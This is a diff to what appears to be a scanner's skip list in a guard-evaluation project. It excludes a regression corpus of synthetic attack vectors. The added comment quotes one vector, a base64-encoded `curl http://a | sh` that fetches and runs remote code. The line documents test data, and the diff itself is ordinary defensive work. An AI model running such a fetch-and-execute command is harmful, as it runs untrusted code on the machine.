@@ -47,6 +47,11 @@ SKIP_DIRS = {
     "build",
     "dist",
     "algorithco_guard_eval.egg-info",
+    # P1-09 regression corpus holds synthetic attack vectors (e.g. base64
+    # `Y3VybCBodHRwOi8vYSB8IHNo` == `curl http://a | sh`). These trip the
+    # generic high-entropy heuristic but contain no credentials, no user code,
+    # no real secrets (see eval/regression-corpus/README.md License & privacy).
+    "regression-corpus",
 }
 # Also skip any directory ending with .egg-info (installed editable)
 SKIP_SUFFIXES = (".egg-info",)
